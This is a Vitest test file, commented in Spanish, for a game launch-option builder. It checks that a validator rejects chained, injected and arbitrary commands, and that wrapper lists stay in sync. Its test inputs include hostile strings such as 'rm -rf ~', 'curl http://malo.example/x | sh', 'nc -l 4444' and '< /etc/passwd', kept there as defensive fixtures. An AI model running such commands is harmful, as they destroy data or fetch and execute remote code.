import { describe, expect, it } from 'vitest';
import {
  KNOWN_WRAPPERS,
  MAX_MANUAL_COMMAND_LENGTH,
  buildProfileCommand,
  checkManualCommand,
  classifyParameter,
} from './command';
import type { GameRules, Profile } from './types';
// Catálogo real de la app. Se importa tal cual para que el test no pueda
// desincronizarse de lo que el backend carga con `include_str!`.
import catalogoJuegos from '../../src-tauri/games.json';
// Igual que games.json: se importa el archivo real. Vite lo inlinea como texto
// (?raw), así que el test no depende de `fs` (jsdom lo stubea).
import preflightRs from '../../src-tauri/src/preflight.rs?raw';
import engineRs from '../../src-tauri/src/engine.rs?raw';

describe('checkManualCommand: comandos normales', () => {
  it('acepta un comando que solo son variables y %command%', () => {
    const r = checkManualCommand('DXVK_HUD=fps %command%');
    expect(r.safe).toBe(true);
    expect(r.reason).toBe('');
  });

  it('acepta envoltorios conocidos', () => {
    for (const cmd of [
      'gamemoderun mangohud %command%',
      'mangohud %command% -novid',
      'gamescope -W 1920 -H 1080 -f -- %command%',
      'prime-run %command%',
      'PROTON_ENABLE_NVAPI=1 gamemoderun %command%',
    ]) {
      expect(checkManualCommand(cmd).safe, cmd).toBe(true);
    }
  });

  it('acepta argumentos con rutas relativas y valores raros', () => {
    // `-w 1920x1080`, `--hdr-enabled`, etc. no son rutas del sistema.
    expect(checkManualCommand('gamescope -w 1920 -h 1080 -- %command%').safe).toBe(true);
  });

  it('no confunde una bandera del juego con el programa', () => {
    // Regresión: todo lo que va DESPUÉS de `%command%` son argumentos del juego.
    // Antes se buscaba el programa en la línea entera y `-novid` se tomaba como
    // ejecutable, así que cualquier comando con banderas se rechazaba.
    for (const cmd of [
      '%command% -novid',
      'PROTON_ENABLE_NVAPI=1 %command% -novid',
      'mangohud %command% -dx11 -novid',
      'DXVK_HUD=fps %command% -console',
    ]) {
      expect(checkManualCommand(cmd).safe, cmd).toBe(true);
    }
  });

  it('rechaza un comando sin %command% y sin programa', () => {
    const r = checkManualCommand('DXVK_HUD=fps');
    expect(r.safe).toBe(false);
    expect(r.reason).toContain('%command%');
  });

  it('expone el programa detectado', () => {
    expect(checkManualCommand('gamemoderun %command%').program).toBe('gamemoderun');
    // La asignación de entorno no es el programa.
    expect(checkManualCommand('DXVK_HUD=fps mangohud %command%').program).toBe('mangohud');
  });
});

describe('checkManualCommand: encadenar órdenes', () => {
  it('rechaza punto y coma', () => {
    const r = checkManualCommand('%command%; rm -rf ~');
    expect(r.safe).toBe(false);
    expect(r.reason).toContain(';');
  });

  it('rechaza tuberías y && / ||', () => {
    for (const cmd of ['%command% | bash', '%command% && curl x', '%command% || true']) {
      expect(checkManualCommand(cmd).safe, cmd).toBe(false);
    }
  });

  it('rechaza sustitución de órdenes', () => {
    for (const cmd of ['$(whoami) %command%', '`id` %command%', '%command% $HOME']) {
      expect(checkManualCommand(cmd).safe, cmd).toBe(false);
    }
  });

  it('rechaza redirecciones', () => {
    for (const cmd of ['%command% > /tmp/x', '%command% < /etc/passwd']) {
      expect(checkManualCommand(cmd).safe, cmd).toBe(false);
    }
  });

  it('rechaza saltos de línea, que esconderían una segunda orden', () => {
    const r = checkManualCommand('mangohud %command%\nrm -rf ~');
    expect(r.safe).toBe(false);
    expect(r.reason).toContain('salto de línea');
  });
});

describe('checkManualCommand: ejecutables no permitidos', () => {
  it('rechaza binarios arbitrarios', () => {
    for (const cmd of ['curl http://x | sh', 'bash -c id', 'python3 x.py', 'nc -l 4444']) {
      expect(checkManualCommand(cmd).safe, cmd).toBe(false);
    }
  });

  it('rechaza rutas absolutas aunque el programa sea conocido', () => {
    // El punto: un comando legítimo se resuelve por PATH. Una ruta concreta
    // apunta a un binario cualquiera que el atacante podría haber colocado.
    const r = checkManualCommand('/usr/local/bin/steam %command%');
    expect(r.safe).toBe(false);
    expect(r.reason).toContain('ruta del sistema');

    expect(checkManualCommand('/home/u/.local/bin/gamemoderun %command%').safe).toBe(false);
    expect(checkManualCommand('~/bin/mangohud %command%').safe).toBe(false);
  });

  it('rechaza vacío y comando demasiado largo', () => {
    expect(checkManualCommand('   ').safe).toBe(false);
    expect(checkManualCommand('mangohud %command% ' + 'a'.repeat(MAX_MANUAL_COMMAND_LENGTH)).safe).toBe(
      false
    );
  });
});

describe('buildProfileCommand: un perfil importado no impone su comando', () => {
  const rules: GameRules = {
    appid: 440,
    name: 'TF2',
    params: [],
  } as unknown as GameRules;

  const baseProfile = {
    id: 'p1',
    name: 'Perfil',
    appid: 440,
    engine: null,
    enabled_params: [],
    selected_community_recs: [],
    selected_engine_recs: [],
    use_manual_command: true,
  } as unknown as Profile;

  it('usa el comando manual si es seguro', () => {
    const profile = { ...baseProfile, manual_command: 'gamemoderun %command%' } as Profile;
    expect(buildProfileCommand(profile, rules, [], null, [])).toBe('gamemoderun %command%');
  });

  it('ignora un comando manual peligroso y cae al comando normal', () => {
    // El caso real: el usuario importa un .json de dudosa procedencia y el perfil
    // trae `use_manual_command: true` con una orden encadenada.
    const profile = {
      ...baseProfile,
      manual_command: '%command%; curl http://malo.example/x | sh',
    } as Profile;

    const cmd = buildProfileCommand(profile, rules, [], null, []);
    expect(cmd).not.toContain('curl');
    // Sin selecciones, el comando normal es el marcador de Steam.
    expect(cmd).toBe('%command%');
  });

  it('ignora un comando manual con ruta absoluta', () => {
    const profile = { ...baseProfile, manual_command: '/tmp/evil %command%' } as Profile;
    expect(buildProfileCommand(profile, rules, [], null, [])).toBe('%command%');
  });
});

// Perfil de prueba reutilizado por los tests de generación de comandos.
const perfil = (over: Partial<Profile> = {}): Profile => ({
  id: 'p1',
  name: 'Perfil',
  appid: 1,
  game_name: 'Juego',
  enabled_params: [],
  selected_community_recs: [],
  selected_engine_recs: [],
  force_proton: false,
  expert_mode: true,
  manual_command: undefined,
  use_manual_command: false,
  notes: undefined,
  created_at: '',
  updated_at: '',
  order: 1,
  ...over,
});

// Reglas mínimas con los envoltorios indicados.
const reglas = (wrappers: string[]): GameRules => ({
  name: 'Juego',
  appid: 1,
  bottleneck: '',
  summary: '',
  has_rules: true,
  tips: [],
  params: wrappers.map((value) => ({
    kind: 'wrapper',
    value,
    impact: 'medio',
    default_on: false,
    title: value,
    why: '',
    evidence: 'heuristica',
    requires: [],
    proton_only: false,
  })),
});

describe('coherencia entre lo que la app genera y lo que acepta', () => {
  // El fallo real: con `game-performance` activado, "Editar manualmente" copiaba
  // el comando generado al editor y el validador lo rechazaba por "no ser un
  // lanzador conocido". Es decir, la app no aceptaba su propio comando, y además
  // avisaba de que "un perfil importado puede traer cualquier cosa" cuando el
  // comando lo había construido la propia app.


  it('todo envoltorio del catálogo se acepta como comando manual', () => {
    // Cada uno por separado y todos juntos: es la forma en que aparecen en
    // games.json y en las recomendaciones.
    const envoltorios = [
      'game-performance',
      'scx_lavd',
      'prime-run',
      'vkbasalt',
      'obs-gamecapture',
      'gamemoderun',
      'mangohud',
      'gamescope',
    ];
    for (const w of envoltorios) {
      const r = checkManualCommand(`${w} %command%`);
      expect(r.safe, `${w} debería ser válido: ${r.reason}`).toBe(true);
    }
    expect(checkManualCommand(envoltorios.join(' ') + ' %command%').safe).toBe(true);
  });

  it('el comando generado con game-performance pasa el validador', () => {
    // Regresión exacta del aviso reportado.
    const rules = reglas(['game-performance']);
    const generado = buildProfileCommand(perfil({ enabled_params: [true] }), rules, [], null, []);

    expect(generado).toBe('game-performance %command%');
    expect(checkManualCommand(generado).safe).toBe(true);
  });

  it('cualquier comando que genere la app es aceptable tal cual', () => {
    // Invariante general: copiar el comando al editor manual nunca debe
    // producir un error. Se prueba la matriz de envoltorios del catálogo.
    for (const w of ['game-performance', 'scx_lavd', 'mangohud', 'gamemoderun', 'gamescope']) {
      const rules = reglas([w]);
      const generado = buildProfileCommand(perfil({ enabled_params: [true] }), rules, [], null, []);
      const check = checkManualCommand(generado);
      expect(check.safe, `generado=${generado} motivo=${check.reason}`).toBe(true);
    }
  });

  it('sigue rechazando un lanzador inventado', () => {
    // Que la lista crezca no debe abrir la puerta a cualquier cosa.
    const r = checkManualCommand('curl http://malo.example/x | sh %command%');
    expect(r.safe).toBe(false);
  });
});

describe('catálogo games.json ↔ validador de comandos', () => {
  // El test anterior fija una lista de envoltorios escrita a mano; si alguien
  // añade uno nuevo a games.json y no aquí, nadie se enteraría hasta que un
  // usuario pulsara "Editar manualmente" y viera el comando rechazado.
  //
  // Este test lee el catálogo REAL y comprueba la invariante de verdad:
  // todo lo que el catálogo puede poner en un comando tiene que ser aceptable.

  // El JSON trae `has_rules`/`tips` implícitos; se normaliza al tipo de la app.
  const catalogo = catalogoJuegos as unknown as GameRules[];

  /** Copia con los campos que el JSON no trae (son de tipo, no de datos). */
  const normalizar = (juego: GameRules): GameRules => ({
    ...juego,
    has_rules: true,
    tips: juego.tips ?? [],
    bottleneck: juego.bottleneck ?? '',
    summary: juego.summary ?? '',
  });

  it('el catálogo se lee y tiene juegos', () => {
    // Si el archivo cambia de forma, este test debe fallar aquí y no con un
    // error críptico más abajo.
    expect(Array.isArray(catalogo)).toBe(true);
    expect(catalogo.length).toBeGreaterThan(0);
    expect(catalogo.some((j) => (j.params ?? []).length > 0)).toBe(true);
  });

  it('todo envoltorio del catálogo pasa el validador', () => {
    const envoltorios = new Set<string>();
    for (const juego of catalogo) {
      for (const p of juego.params ?? []) {
        if (p.kind === 'wrapper') envoltorios.add(p.value);
      }
    }
    expect(envoltorios.size).toBeGreaterThan(0);

    for (const w of [...envoltorios].sort()) {
      const check = checkManualCommand(`${w} %command%`);
      expect(check.safe, `games.json declara el envoltorio «${w}» como kind:"wrapper" pero el validador no lo acepta: ${check.reason}`).toBe(true);
    }
  });

  it('el comando generado para CADA juego y CADA parámetro válido es aceptable', () => {
    // La prueba más directa: se genera el comando real de cada juego con cada
    // parámetro activado, y ese mismo comando tiene que pasar el validador.
    // Es exactamente lo que ocurre al pulsar "Editar manualmente".
    let comprobados = 0;

    for (const juego of catalogo) {
      const rules = normalizar(juego);

      (juego.params ?? []).forEach((_, i) => {
        const enabled = (juego.params ?? []).map((__, j) => j === i);
        const generado = buildProfileCommand(
          perfil({ appid: juego.appid, enabled_params: enabled }),
          rules,
          [],
          null,
          []
        );

        // Un `config` es texto libre del ajuste dentro del juego: no entra en el
        // comando, así que el resultado es el comando base.
        const check = checkManualCommand(generado);
        expect(
          check.safe,
          `juego=«${juego.name}» param=«${juego.params[i].value}» generado=«${generado}» motivo=${check.reason}`
        ).toBe(true);
        comprobados++;
      });
    }

    // Confirma que el bucle hizo trabajo y no pasó en vacío.
    expect(comprobados).toBeGreaterThan(20);
  });

  it('el comando generado con TODOS los parámetros activados también es aceptable', () => {
    for (const juego of catalogo) {
      const rules = normalizar(juego);

      const todoActivo = (juego.params ?? []).map((p) => p.kind !== 'config');
      const generado = buildProfileCommand(
        perfil({ appid: juego.appid, enabled_params: todoActivo }),
        rules,
        [],
        null,
        []
      );

      const check = checkManualCommand(generado);
      expect(
        check.safe,
        `juego=«${juego.name}» con todo activo generado=«${generado}» motivo=${check.reason}`
      ).toBe(true);
    }
  });
});

describe('classifyParameter: un envoltorio nunca acaba detrás de %command%', () => {
  // Antes esto fallaba: `prime-run`, `vkbasalt`, `obs-gamecapture`,
  // `game-performance` y `scx_lavd` se clasificaban como `arg`, así que el
  // comando salía como `%command% prime-run`, es decir, el envoltorio pasado
  // como ARGUMENTO del juego en vez de envolverlo. El juego arrancaba sin
  // prime-run y el usuario no entendía por qué.

  it('todos los envoltorios conocidos se clasifican como wrapper', () => {
    // Si esta lista se queda corta, volvemos al mismo bug.
    expect(KNOWN_WRAPPERS.length).toBeGreaterThanOrEqual(8);
    for (const w of KNOWN_WRAPPERS) {
      expect(classifyParameter(w), `«${w}» debería ser wrapper`).toBe('wrapper');
    }
  });

  it('las variables de entorno se clasifican como env', () => {
    for (const v of ['MANGOHUD=1', 'DXVK_HUD=fps', 'PROTON_USE_NTSYNC=1', '__NV_PRIME_RENDER_OFFLOAD=1']) {
      expect(classifyParameter(v), `«${v}» debería ser env`).toBe('env');
    }
  });

  it('una bandera del juego se sigue clasificando como argumento', () => {
    // Esto sí va detrás de %command%: son argumentos para el juego.
    for (const a of ['-novid', '-dx11', 'dxlevel 81']) {
      expect(classifyParameter(a), `«${a}» debería ser arg`).toBe('arg');
    }
  });

  it('una recomendación con envoltorio acaba ANTES de %command%, no después', () => {
    // El caso completo, tal como lo arma `buildProfileCommand`: una
    // recomendación de la comunidad cuyo parámetro es un envoltorio.
    for (const wrapper of KNOWN_WRAPPERS) {
      const cmd = buildProfileCommand(
        perfil({ selected_community_recs: [0] }),
        reglas([]),
        [{ parameter: wrapper, description: '', optimized_for: [], notes: undefined, recommended: true }],
        null,
        [],
      );
      expect(cmd, `«${wrapper}» debería ir delante`).toContain(`${wrapper} %command%`);
      expect(cmd, `«${wrapper}» no debería acabar detrás`).not.toMatch(
        new RegExp(`%command%[^]*\\b${wrapper}\\b`),
      );
    }
  });
});

describe('las recomendaciones de la app se arman bien', () => {
  it('cada envoltorio de las recomendaciones reales acaba delante de %command%', async () => {
    // Las recomendaciones de la comunidad vienen de `engine.rs`
    // (`get_hardware_recommendations`), no de la red. Este test recorre los
    // parámetros REALES de esa lista para que un envoltorio añadido allí sin
    // estar en KNOWN_WRAPPERS rompa aquí en vez de en la máquina del usuario.
    const fuente = engineRs;
    const parametros = [...fuente.matchAll(/parameter:\s*"([^"]+)"/g)].map((m) => m[1]);
    expect(parametros.length).toBeGreaterThan(0);

    for (const parametro of parametros) {
      const kind = classifyParameter(parametro);
      const cmd = buildProfileCommand(
        perfil({ selected_community_recs: [0] }),
        reglas([]),
        [{ parameter: parametro, description: '', optimized_for: [], notes: undefined, recommended: true }],
        null,
        [],
      );
      if (kind === 'wrapper') {
        expect(cmd, `«${parametro}» debería ir delante`).toContain(`${parametro} %command%`);
      }
      // En cualquier caso el comando generado tiene que pasar el validador.
      const r = checkManualCommand(cmd);
      expect(r.safe, `«${cmd}» debería ser seguro: ${r.reason}`).toBe(true);
    }
  });
});

describe('la lista de envoltorios coincide con la de preflight.rs', () => {
  it('KNOWN_WRAPPERS (TS) y KNOWN_WRAPPERS (Rust) son la misma lista', () => {
    // Hay dos copias porque el frontend clasifica y el backend comprueba qué
    // envoltorios están instalados. Si se separan, uno de los dos miente: el
    // frontend mete un envoltorio que el backend no revisa, o al contrario.
    // Este test lee el archivo Rust para que no puedan desincronizarse en silencio.
    const fuente = preflightRs;

    // Se busca el array `KNOWN_WRAPPERS` y se extraen sus cadenas.
    const m = fuente.match(/pub const KNOWN_WRAPPERS[^=]*=\s*\[([^\]]*)\]/);
    expect(m, 'no se encontró KNOWN_WRAPPERS en preflight.rs').not.toBeNull();
    const enRust = [...m![1].matchAll(/"([^"]+)"/g)].map((x) => x[1]).sort();
    const enTs = [...KNOWN_WRAPPERS].sort();

    expect(enTs).toEqual(enRust);
  });
});
